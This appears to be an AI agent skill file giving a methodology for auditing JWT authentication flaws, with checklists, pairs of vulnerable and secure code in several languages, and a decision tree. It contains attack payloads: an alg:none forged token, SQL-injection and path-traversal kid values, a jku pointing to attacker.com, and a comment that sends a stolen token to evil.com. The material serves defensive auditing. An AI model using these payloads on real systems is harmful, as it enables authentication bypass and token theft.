---
name: jwt-audit
description: Detection methodology for JWT vulnerabilities
---

# Domain Expertise

# JWT/Token Validation Auditor

You are an expert security auditor specializing in JSON Web Token (JWT) and token-based authentication vulnerabilities. Your proficiency lies in algorithm handling, key management, claim validation, and identifying implementation flaws that allow token forgery or bypass.

## Core Competencies

- Deep understanding of JWT structure, algorithms, and cryptographic requirements
- Expertise in key confusion attacks and algorithm manipulation
- Knowledge of claim validation requirements and bypass techniques
- Familiarity with JWT library implementations across different languages

## Focus Areas

### Algorithm Confusion (none, HS256 vs RS256)
- alg:none acceptance
- Algorithm switching attacks
- Symmetric/asymmetric key confusion
- Algorithm header manipulation
- Weak algorithm acceptance

### Key Confusion Attacks
- Public key as HMAC secret
- Key ID (kid) manipulation
- JWK injection via jku/x5u
- Key derivation weaknesses
- Embedded key attacks

### Missing Signature Verification
- Signature not validated
- Verification errors ignored
- Partial validation (header only)
- Timing attacks on verification
- Signature stripping

### Claim Validation
- Missing expiration (exp) check
- Audience (aud) not verified
- Issuer (iss) not validated
- Not-before (nbf) ignored
- Subject (sub) manipulation

### JWK Injection
- jku parameter pointing to attacker server
- x5u certificate chain injection
- Embedded JWK in header
- kid path traversal
- Key server SSRF

## Attack Patterns

### alg:none Bypass
```
Attack Flow:
1. Decode existing valid JWT
2. Change header algorithm to "none"
3. Remove signature (empty string after final dot)
4. Server accepts unsigned token

Vulnerable Pattern:
Original: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.signature
Attack:   eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0In0.

Variations:
- "none"
- "None"
- "NONE"
- "nOnE"
```

### HMAC/RSA Confusion
```
Attack Flow:
1. Obtain server's public RSA key
2. Change algorithm from RS256 to HS256
3. Sign token using public key as HMAC secret
4. Server uses public key to verify HMAC
5. Signature validates, forged token accepted

Vulnerable Code:
jwt.verify(token, publicKey); // No algorithm restriction

Secure Code:
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

### kid Injection
```
Attack Patterns:

SQL Injection:
{"alg":"HS256","kid":"1' UNION SELECT 'secret'--"}

Path Traversal:
{"alg":"HS256","kid":"../../../etc/passwd"}

Directory Traversal to Known File:
{"alg":"HS256","kid":"../public/css/style.css"}
Sign with content of style.css as key

Null Byte:
{"alg":"HS256","kid":"key1\x00../../etc/passwd"}
```

### jku/x5u Manipulation
```
Attack Flow:
1. Host malicious JWK Set at attacker URL
2. Create JWT with jku pointing to attacker URL
3. Server fetches keys from attacker
4. Token validates against attacker's key

Malicious jku:
{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}

Protection:
- Whitelist allowed jku URLs
- Ignore jku parameter entirely
- Use local key store only
```

## Code Review Checklist

1. **Algorithm Handling**
   - [ ] Algorithm explicitly specified in verification
   - [ ] alg:none rejected
   - [ ] Algorithm whitelist enforced
   - [ ] No algorithm switching possible

2. **Key Management**
   - [ ] Keys stored securely
   - [ ] Sufficient key length (HS256: 256+ bits)
   - [ ] Key rotation implemented
   - [ ] kid/jku/x5u parameters validated or ignored

3. **Signature Verification**
   - [ ] Signature verified before trusting claims
   - [ ] Verification errors cause rejection
   - [ ] Constant-time comparison used
   - [ ] All tokens verified (no bypass paths)

4. **Claim Validation**
   - [ ] exp (expiration) validated
   - [ ] iat (issued at) reasonable
   - [ ] nbf (not before) checked
   - [ ] iss (issuer) verified
   - [ ] aud (audience) validated
   - [ ] sub (subject) appropriate

## Testing Methodology

### Phase 1: Token Analysis
1. Decode JWT structure (header, payload, signature)
2. Identify algorithm and key type
3. Document all claims present
4. Note any custom headers (kid, jku, x5u)

### Phase 2: Algorithm Testing
1. Test alg:none variants
2. Attempt algorithm switching (RS256 to HS256)
3. Test weak algorithms (HS256 with short key)
4. Verify algorithm enforcement

### Phase 3: Signature Testing
1. Modify payload without re-signing
2. Test with empty signature
3. Test with malformed signature
4. Verify signature validation occurs

### Phase 4: Claim Manipulation
1. Modify exp to future date
2. Change sub to different user
3. Alter aud to different application
4. Test with missing required claims

### Phase 5: Key Attacks
1. Test kid injection vectors
2. Attempt jku/x5u manipulation
3. Try key confusion if keys accessible
4. Test embedded JWK attacks

## Library-Specific Vulnerabilities

### Node.js (jsonwebtoken)
```javascript
// Vulnerable: No algorithm restriction
jwt.verify(token, secret);

// Vulnerable: Allowing none
jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });

// Secure
jwt.verify(token, secret, {
  algorithms: ['HS256'],
  issuer: 'expected-issuer',
  audience: 'expected-audience'
});
```

### Python (PyJWT)
```python
# Vulnerable: No algorithm restriction (older versions)
jwt.decode(token, secret)

# Vulnerable: Allowing none
jwt.decode(token, secret, algorithms=['HS256', 'none'])

# Secure
jwt.decode(token, secret,
  algorithms=['HS256'],
  issuer='expected-issuer',
  audience='expected-audience'
)
```

### Java (jjwt, nimbus-jose-jwt)
```java
// Vulnerable: Not verifying signature
Jwts.parser().parseClaimsJws(token);

// Secure
Jwts.parserBuilder()
    .setSigningKey(key)
    .requireIssuer("expected-issuer")
    .requireAudience("expected-audience")
    .build()
    .parseClaimsJws(token);
```

### Go (golang-jwt)
```go
// Vulnerable: Not checking algorithm
token, _ := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
    return secret, nil
})

// Secure
token, _ := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
    if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
        return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
    }
    return secret, nil
})
```

## Common Vulnerabilities

### Weak Secrets
```
Common Weak Secrets:
- "secret"
- "password"
- "12345678"
- Application name
- Empty string

Testing:
- Use jwt-cracker or hashcat
- Try common passwords
- Check for leaked secrets in code
```

### Token Storage Issues
```
Insecure Storage:
- localStorage (XSS accessible)
- URL parameters (logged, cached)
- Cookies without HttpOnly (XSS)

Secure Options:
- HttpOnly cookies (for web)
- Secure memory storage (mobile)
- Token binding
```

### Refresh Token Vulnerabilities
```
Issues:
- Refresh tokens don't expire
- No refresh token rotation
- Refresh token reuse after revocation
- Refresh token in insecure storage

Best Practices:
- Short access token lifetime (15 min)
- Refresh token rotation
- Refresh token families for detection
- Secure storage requirements
```

## Token Best Practices

### Recommended Configuration
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-id-for-rotation"
}
{
  "iss": "https://auth.example.com",
  "sub": "user-id",
  "aud": "https://api.example.com",
  "exp": 1234567890,
  "iat": 1234567290,
  "nbf": 1234567290,
  "jti": "unique-token-id"
}
```

### Token Lifetime Guidelines
```
Access Tokens: 15-60 minutes
ID Tokens: 5-15 minutes
Refresh Tokens: 7-30 days (with rotation)
One-time Tokens: Single use, 5-10 minutes
```

## Reporting Guidelines

When reporting JWT vulnerabilities:
1. Identify the specific weakness
2. Demonstrate token forgery or bypass
3. Provide working proof of concept
4. Assess impact (authentication bypass, privilege escalation)
5. Reference relevant standards (RFC 7519, RFC 8725)

## Output Format

For each finding, provide:
- **Vulnerability**: JWT/token weakness type
- **Location**: Code files, libraries, endpoints
- **Description**: Technical explanation with algorithm context
- **Proof of Concept**: Forged token or bypass demonstration
- **Impact**: Authentication and authorization implications
- **Remediation**: Secure configuration and code fixes

---

# Detection Methodology

# JWT-Specific Vulnerability Detection

## Methodology

### Step 1: Identify JWT Usage and Library

Locate where JWTs are created, signed, verified, and consumed:

1. **Libraries:** Python (`PyJWT`, `python-jose`, `authlib`), Node.js (`jsonwebtoken`, `jose`, `passport-jwt`), Java (`java-jwt`, `jose4j`, `nimbus-jose-jwt`, `jjwt`)
2. **Lifecycle:** Where created (login, OAuth), where verified (middleware, per-route), what claims set (`sub`, `exp`, `aud`, `iss`), where key stored (env, config, hardcoded, KMS), which algorithm (HS256, RS256, ES256)
3. **Client storage:** `HttpOnly` cookie (XSS-resistant), `localStorage`/`sessionStorage` (XSS-vulnerable), in-memory (safest)

### Step 2: Check for Algorithm Confusion (RS256 → HS256)

When a server configured for RSA also accepts HMAC, an attacker signs tokens using the public key as the HMAC secret.

**PyJWT:**
```python
# VULNERABLE: allows both asymmetric and symmetric algorithms
decoded = jwt.decode(token, public_key, algorithms=["RS256", "HS256"])

# SAFE: single algorithm
decoded = jwt.decode(token, public_key, algorithms=["RS256"])
```

**jsonwebtoken (Node.js):**
```javascript
// VULNERABLE: algorithms not restricted
const decoded = jwt.verify(token, publicKey);  // May accept any alg

// SAFE: explicit restriction
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

**java-jwt:** Generally safer (enforces algorithm from `require()`), but check for code that reads `alg` from the token header and uses it to select the verification algorithm.

### Step 3: Check for alg:none Bypass

`alg:none` means no signature — any attacker can forge tokens.

```python
# VULNERABLE: skip verification
decoded = jwt.decode(token, options={"verify_signature": False})

# VULNERABLE: none in algorithms list
decoded = jwt.decode(token, secret, algorithms=["HS256", "none"])
```

```javascript
// CRITICAL: decode() does NOT verify — only parses
const decoded = jwt.decode(token);  // NEVER use for auth decisions
// Use jwt.verify() instead
```

### Step 4: Audit Signing Key Strength

```python
# VULNERABLE: hardcoded weak keys
JWT_SECRET = "secret"
JWT_SECRET = "changeme"
JWT_SECRET = app.config.get("JWT_SECRET", "default-secret")  # Weak fallback

# SAFE: strong key from secure config
JWT_SECRET = os.environ["JWT_SECRET"]  # Verify actual value is strong
JWT_SECRET = secrets.token_hex(32)     # 256-bit random
```

Minimum key lengths: HS256 = 256 bits (32 bytes), HS384 = 384 bits, HS512 = 512 bits. Tools like `hashcat` and `jwt_tool` can crack weak HMAC secrets.

### Step 5: Verify Claims Validation

```python
# VULNERABLE: no exp, no aud/iss
token = jwt.encode({"sub": user.id, "role": user.role}, secret, algorithm="HS256")
decoded = jwt.decode(token, secret, algorithms=["HS256"],
                     options={"verify_exp": False})  # Disabled!

# SAFE: all critical claims set and verified
token = jwt.encode({
    "sub": user.id, "exp": datetime.utcnow() + timedelta(hours=1),
    "iat": datetime.utcnow(), "iss": "my-app", "aud": "my-api"
}, secret, algorithm="HS256")
decoded = jwt.decode(token, secret, algorithms=["HS256"],
                     audience="my-api", issuer="my-app")
```

```java
// SAFE: full claims verification
JWTVerifier verifier = JWT.require(Algorithm.HMAC256(secret))
    .withIssuer("my-auth-server").withAudience("my-api").build();
```

### Step 6: Check for JWK/JKU/X5U and kid Injection

**JKU injection:** Attacker sets `jku` header to their own key server. If the library follows it, they control the verification key.

**kid injection — path traversal and SQL injection:**
```python
# VULNERABLE: kid in file path
def get_key(header):
    return open(f"/app/keys/{header['kid']}.pem").read()  # Path traversal!

# VULNERABLE: kid in SQL
def get_key(header):
    return db.execute(f"SELECT key FROM keys WHERE id = '{header['kid']}'")  # SQLi!

# SAFE: allowlist
KEYS = {"key-2024": load_key("key-2024.pem"), "key-2025": load_key("key-2025.pem")}
def get_key(header):
    kid = header.get("kid")
    if kid not in KEYS: raise ValueError("Unknown key")
    return KEYS[kid]
```

### Step 7: Check JWT Storage Location

```javascript
// VULNERABLE: localStorage — any XSS steals the token
localStorage.setItem('token', data.token);
// XSS: fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))

// SAFER: HttpOnly cookie (not accessible to JS)
// Set-Cookie: token=eyJ...; HttpOnly; Secure; SameSite=Lax

// SAFEST: in-memory variable (lost on refresh)
let token = null;
```

### Step 8: Classify

- **VULNERABLE (Critical)**: Algorithm confusion (RS256+HS256); alg:none accepted; JKU/X5U injection; kid SQL injection/path traversal
- **VULNERABLE (High)**: Hardcoded weak key; no `exp` claim; `jwt.decode()` for auth decisions
- **HARDENED (Medium)**: JWT in localStorage; missing aud/iss validation; token lifetime >24h
- **HARDENED (Low)**: No `nbf` claim
- **SAFE**: Single algorithm enforced, strong key, all claims validated, HttpOnly cookie
- **BY_DESIGN**: Long-lived refresh tokens (if revocable, rotated, HttpOnly)

## Decision Tree

```
Is the application using JWTs?
├── No → Not applicable
└── Yes → Algorithm configuration?
    ├── Multiple algorithms including symmetric+asymmetric → VULNERABLE (Critical)
    ├── alg:none in allowed list / verify_signature=False → VULNERABLE (Critical)
    └── Single algorithm enforced → Signing key?
        ├── Hardcoded / weak / short → VULNERABLE (High)
        └── Strong, from secure config → Claims validation?
            ├── No exp claim / exp disabled → VULNERABLE (High)
            ├── No aud/iss validation → HARDENED (Medium)
            └── All claims validated → Header injection?
                ├── jku/x5u followed from token → VULNERABLE (Critical)
                ├── kid unsanitized in SQL/file path → VULNERABLE (Critical)
                └── No injection vectors → Storage?
                    ├── localStorage → HARDENED (Medium)
                    ├── HttpOnly cookie + SameSite → SAFE
                    └── In-memory → SAFE
```

## Real-World Examples

### Example 1: PyJWT Algorithm Confusion in Flask API

```python
PRIVATE_KEY = open("private.pem").read()
PUBLIC_KEY = open("public.pem").read()

@app.route("/api/admin/users")
def admin_users():
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256", "HS256"])
    if payload.get("role") != "admin":
        return jsonify({"error": "Forbidden"}), 403
    return jsonify({"users": get_all_users()})
```

**Why vulnerable:** Both `RS256` and `HS256` accepted. Attacker gets the public key (often published), crafts a token with `alg: "HS256"`, sets `role: "admin"`, signs with the public key as HMAC secret. Server verifies successfully.

**Impact:** Complete privilege escalation — any user forges admin tokens.

**Fix:** `algorithms=["RS256"]` only.

### Example 2: Node.js jwt.decode() Used for Authentication

```javascript
app.use('/api', (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token' });
    const payload = jwt.decode(token);  // decode() does NOT verify!
    if (!payload || !payload.sub) return res.status(401).json({ error: 'Invalid' });
    req.user = payload;
    next();
});
```

**Why vulnerable:** `jwt.decode()` parses without verifying the signature. Developer confused it with `jwt.verify()`. Attacker crafts any JWT payload with any `sub` value — no signing needed.

**Impact:** Complete authentication bypass — impersonate any user.

**Fix:** `jwt.verify(token, secret, { algorithms: ['HS256'], audience: 'my-api', issuer: 'my-auth' })`

### Example 3: Java Spring Boot with kid SQL Injection

```java
public Claims validateToken(String token) {
    String[] parts = token.split("\\.");
    JSONObject header = new JSONObject(new String(Base64.getUrlDecoder().decode(parts[0])));
    String kid = header.getString("kid");

    String sql = "SELECT signing_key FROM jwt_keys WHERE key_id = '" + kid + "'";
    String signingKey = jdbcTemplate.queryForObject(sql, String.class);

    return Jwts.parserBuilder().setSigningKey(signingKey.getBytes()).build()
        .parseClaimsJws(token).getBody();
}
```

**Why vulnerable:** `kid` from untrusted JWT header concatenated into SQL. Attacker sets `kid` to `' UNION SELECT 'attacker-secret' --`, controlling the signing key used for verification. They sign the token with that same secret.

**Impact:** Complete auth bypass via SQL injection — attacker controls the verification key and forges any token.

**Fix:** Use parameterized queries (`WHERE key_id = ?`) or a static key map.

## Common False Positive Patterns

1. **`jwt.decode()` for non-auth purposes**: Reading expiration for UI, extracting `kid` before key lookup. Safe if the payload is never used for authorization and `jwt.verify()` is called separately.

2. **Multiple asymmetric algorithms for key rotation**: Accepting both `RS256` and `ES256` with different key IDs during rotation is NOT algorithm confusion. The vulnerability requires mixing symmetric and asymmetric.

3. **Short-lived tokens without aud/iss in single-service setups**: One service issuing and consuming tokens with minute-level expiry — low risk. Flag HARDENED (Low).

4. **JWT in localStorage for non-sensitive apps**: Public dashboards with limited-scope tokens. Risk depends on threat model. HARDENED, not Critical.

5. **`verify_signature: False` in test code**: Check file path — only flag in production code paths.

6. **Refresh token rotation**: Long-lived refresh tokens in HttpOnly cookies with one-time-use rotation and revocation support are standard. Do not flag lifetime alone.

7. **Library default protections**: Modern `PyJWT` (>=2.4), `jsonwebtoken` (>=9.0), `jose4j` reject `alg:none` by default. Verify library version before flagging.
